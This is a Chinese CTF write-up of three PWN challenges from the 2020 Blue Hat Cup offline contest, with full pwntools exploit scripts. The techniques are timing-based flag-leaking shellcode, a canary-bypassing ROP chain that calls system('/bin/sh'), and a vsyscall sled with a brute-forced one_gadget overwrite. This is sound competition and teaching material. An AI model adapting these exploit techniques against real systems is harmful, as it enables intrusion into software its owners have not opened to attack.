> 原文链接: https://www.anquanke.com//post/id/226089 


# 2020 蓝帽杯线下赛PWN WriteUp


                                阅读量   
                                **313726**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t014908611c47fec869.png)](https://p5.ssl.qhimg.com/t014908611c47fec869.png)



## slient

这个题目很容易看到这是执行`shellcode`，但是长度最大只有`0x40`字节。这个题目和天翼杯的`safebox`的题目类似，都是写入`shellcode`爆破`flag`。这里直接用的[天翼杯2020_wp_by_LQers](https://www.freebuf.com/articles/network/245664.html)中的`shellcode`。

```
# encoding=utf-8
from pwn import *

file_path = "./chall"
context.arch = "amd64"
# context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
# if debug:
#     p = process([file_path])
#     gdb.attach(p, "b *$rebase(0xC94)")
#     libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#     one_gadget = 0x0
#
# else:
#     p = remote('', 0)
#     libc = ELF('')
#     one_gadget = 0x0


def pwn(p, index, ch):

    read_next = "xor rax, rax; xor rdi, rdi;mov rsi, 0x10100;mov rdx, 0x300;syscall;"
    # open
    shellcode = "push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;"

    # re open, rax =&gt; 4
    shellcode += "push 2; pop rax; syscall;"

    # read(rax, 0x10040, 0x50)
    shellcode += "mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"

    # cmp and jz
    if index == 0:
        shellcode += "cmp byte ptr[rsi+`{`0`}`], `{`1`}`; jz $-3; ret".format(index, ch)
    else:
        shellcode += "cmp byte ptr[rsi+`{`0`}`], `{`1`}`; jz $-4; ret".format(index, ch)

    shellcode = asm(shellcode)

    # p.sendlineafter("execution-box.\n", read_next.ljust(0x30))

    p.sendafter("execution-box.\n", shellcode.ljust(0x40 - 14, b'a') + b'./flag')


index = 0
ans = []
while True:
    for ch in range(0x20, 127):
        if debug:
            p = process([file_path])
        else:
            p = remote('8.131.246.36', 40334)
        pwn(p, index, ch)
        start = time.time()
        try:
            p.recv(timeout=2)
        except:
            pass
        end = time.time()
        p.close()
        if end - start &gt; 1.5:
            ans.append(ch)
            print("".join([chr(i) for i in ans]))
            break
    else:
        print("".join([chr(i) for i in ans]))
        break
    index = index + 1
    print(ans)

print("".join([chr(i) for i in ans]))
```



## fuantoie

这个题目在`edit，show`函数中很多扰乱视线的东西，`add，delete`函数很容易就可以分析出来，并不存在漏洞。因此漏洞主要集中于`edit,show`这两个函数中。

经过手动测试和分析发现漏洞位于`0x4011F1`函数中

[![](https://p0.ssl.qhimg.com/t010937a374d7c9edda.png)](https://p0.ssl.qhimg.com/t010937a374d7c9edda.png)

这里`snprintf`函数的返回结果是我们输入的字符串的长度，也就是`input_200_buf`字符串数组中的长度。因此结合后面的`for`循环就可以进行栈溢出。但是程序开启了`canary`。这里就需要绕过一下，输入`+/-`即可。构造`rop`泄漏出`libc`地址之后，直接`rop`执行`system("/bin/sh")`即可。

在构造的时候需要注意的一点就是，这里写入的是`%d`也就是四字节，因此对于一个地址我们需要分两次写入。

```
# encoding=utf-8
from pwn import *

file_path = "./pwn"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    gdb.attach(p, "b *0x04012A2\nb *0x401287")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('8.131.246.36', 15823)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0


def add(size):
    p.sendlineafter("&gt;&gt; ", "1")
    p.sendlineafter("size?\n", str(size))


def delete(index):
    p.sendlineafter("&gt;&gt; ", "2")
    p.sendlineafter("index ?\n", str(index))


def edit(index, content, test):
    p.sendlineafter("&gt;&gt; ", "3")
    p.sendlineafter("index ?\n", str(index))
    p.sendafter("new content ?\n", content)
    p.sendlineafter("pass some test first\n", str(test))


def show(index):
    p.sendlineafter("&gt;&gt; ", "4")
    p.sendlineafter("index ?\n", str(index))


p_rdi_r = 0x0000000000401763
start = 0x400750

payload = "+\n"*38
payload += str(p_rdi_r) + "\n0\n"
payload += str(elf.got['puts']) + "\n0\n" + str(elf.plt['puts']) + "\n0\n"
payload += str(start) + "\n0\n"

show(22)
p.sendlineafter("boy\n", "a"*(38 + 8 - 1))
p.sendlineafter("lo\n", payload)

libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - libc.sym['puts']

bin_sh_address = libc.search(b"/bin/sh\x00").__next__()
system_address = libc.sym['system']

payload = "+\n"*38
payload += str(p_rdi_r) + "\n0\n"
payload += str(bin_sh_address &amp; 0xffffffff) + "\n"
payload += str(bin_sh_address &gt;&gt; 32)+"\n"
payload += str(system_address &amp; 0xffffffff) + "\n"
payload += str(system_address &gt;&gt; 32) + "\n"
payload += str(start) + "\n0\n"

show(22)
log.success("libc address is `{``}`".format(hex(libc.address)))
p.sendlineafter("boy\n", "a"*(38 + 8 - 1))
p.sendlineafter("lo\n", payload)

# add(0x68)
# edit(0, "a", 112)
# p.sendlineafter("I love you so much\n", "a"*0x200)
# p.sendline("a"*112)

p.interactive()
```



## simple_canary

很明显的栈溢出漏洞，但是程序开启了`pie`，由于这里`GLIBC&lt;=2.23`因此这里可以使用`vsyscall`作为滑板指令，这里和`DASCTF 8`月赛类似，我们先来看一下`read`完毕之后的栈

[![](https://p0.ssl.qhimg.com/t01ac6012825c3eff42.png)](https://p0.ssl.qhimg.com/t01ac6012825c3eff42.png)

如果此时程序中存在后门的话，我们修改任意一个`elf`地址的低位指向后门函数，之后利用滑板指令滑到此处即可。但是该程序中并不存在后门。因此这里我采用的是覆写`libc_start_main+240`为`one_gadget`进行爆破。这种方式`1/(16*16*16)`的概率。

```
# encoding=utf-8
from pwn import *

file_path = "./pwn"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    gdb.attach(p, "b *$rebase(0x116e)")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

else:
    p = remote('8.131.246.36', 38989)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

''''
root@18491090a044:~/work# one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
root@18491090a044:~/work#

20840
'''

# one_gadget = 0x45226
#  0x7ffff7a0d000--
one_gadget = 0xa9b226

while True:
    try:
        payload = b'a' * (0x20) + p64(0xdeadbeef)
        payload += p64(0xffffffffff600000) * 8
        payload += p64(one_gadget)[:3]
        p.sendafter("input something:\n", payload)
        p.sendline("cat flag")
        p.sendline("cat /flag")
        res = p.recv()
        print(res)
        if b"flag" not in res:
            raise EOFError
        break
    except KeyboardInterrupt:
        exit()
    except:
        p.close()
        p = remote('8.131.246.36', 38989)
```
